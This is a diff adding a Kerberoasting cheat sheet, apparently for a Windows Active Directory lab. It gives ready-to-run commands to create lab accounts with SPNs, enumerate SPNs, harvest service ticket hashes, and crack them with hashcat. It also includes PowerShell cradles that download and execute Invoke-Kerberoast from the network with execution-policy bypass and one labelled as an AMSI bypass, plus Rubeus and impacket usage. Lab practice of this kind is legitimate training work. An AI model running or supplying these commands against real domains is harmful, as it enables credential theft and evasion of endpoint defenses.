@@ -1,0 +1,93 @@
+The following details how to set up Kerberoasting in your own windows lab.
+
+-------------------------------
+
+Add users and create SPN for them
+
+net user DA Passw0rd! /ADD /DOMAIN
+net user User1 Passw0rd! /ADD /DOMAIN
+net group "Domain Admins" DA /add
+setspn -s http/server1.hacklab.local:8080 DA
+setspn -s http/server1.hacklab.local:8081 User1
+
+-------------------------------
+
+Delete users and assigned SPN
+
+setspn -d http/server1.hacklab.local:8080 DA
+setspn -d http/server1.hacklab.local:8081 User1
+net user DA /DELETE /DOMAIN
+net user User1 /DELETE /DOMAIN
+
+-------------------------------
+
+See all the assigned SPN for a defined user
+
+setspn -L hacklab.local\service1
+
+Registered ServicePrincipalNames for CN=service1,CN=Users,DC=hacklab,DC=local:
+        mssql/hacklab.local:80
+        http/hacklab.local:80
+        
+-------------------------------
+
+Power Shell one liner to find all SPN tests all domain users
+
+cls ; $search = New-Object DirectoryServices.DirectorySearcher([ADSI]“”) ; $search.filter = “(servicePrincipalName=*)” ; $results = $search.Findall() ; foreach($result in $results) { $userEntry = $result.GetDirectoryEntry() ; Write-host “Object Name = “ $userEntry.name -backgroundcolor “yellow” -foregroundcolor “black” ; Write-host “DN = “  $userEntry.distinguishedName ; Write-host “Object Cat. = “ $userEntry.objectCategory ; Write-host “servicePrincipalNames” ; $i=1 ; foreach($SPN in $userEntry.servicePrincipalName) { ; Write-host “SPN(“ $i “) = “ $SPN ; $i+=1 } ; Write-host “” }
+
+-------------------------------
+
+How to run Kerberoasting with Power Shell
+
+Runs and closes PS -w 1
+
+powershell -w 1 -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/myexploit/PS_Scripts_Backup/master/Invoke-Kerberoast.ps1') ; Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-Hash0.txt"
+
+-------------------------------
+
+Without closing the PS session
+
+powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/myexploit/PS_Scripts_Backup/master/Invoke-Kerberoast.ps1') ; Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-Hash0.txt"
+
+-------------------------------
+
+AMSI bypass works 05/06/2019 - Mohammed Danish https://medium.com/@gamer.skullie/bypassing-amsi-with-an-unconventional-powershell-cradle-6bd15a17d8b9
+
+$webreq = [System.Net.WebRequest]::Create(‘https://raw.githubusercontent.com/myexploit/PS_Scripts_Backup/master/Invoke-Kerberoast.ps1’); $resp=$webreq.GetResponse(); $respstream=$resp.GetResponseStream(); $reader=[System.IO.StreamReader]::new($respstream); $content=$reader.ReadToEnd(); IEX($content); Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-Hash0.txt
+
+-------------------------------
+
+How to load .ps1 locally
+
+powershell -ep bypass
+Import-module .\Invoke-Kerberoast.ps1 ; Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-Hash0.txt
+
+-------------------------------
+
+How to run Kerberoasting with C#
+
+https://github.com/GhostPack/Rubeus
+
+Rubeus.exe kerberoast /format:hashcat
+
+-------------------------------
+
+How to run Kerberoasting with impacket using Kali
+
+In Kali add a static DNS entry for the full domain the IP should point at the DC
+
+gedit /etc/hosts
+
+Make sure you can ping the full domain.
+
+./GetUserSPNs.py -request Add-Full-Domain-Name/Add-User-Name
+
+If it can connect to the DC it will prompt for a password.
+
+-------------------------------
+
+How to reverse hashes collected from Kerberoasting
+
+hashcat64.exe -m 13100 "hash" "wordlist" --outfile="filename"
+
+hashcat64.exe -m 13100 "C:\Users\YepYepYep\Desktop\Kerb1" C:\Users\YepYepYep\Documents\Wordlists\Rocktastic12a --outfile="C:\Users\YepYepYep\Desktop\Kerb1CrackedKerb-Hashes1.txt"
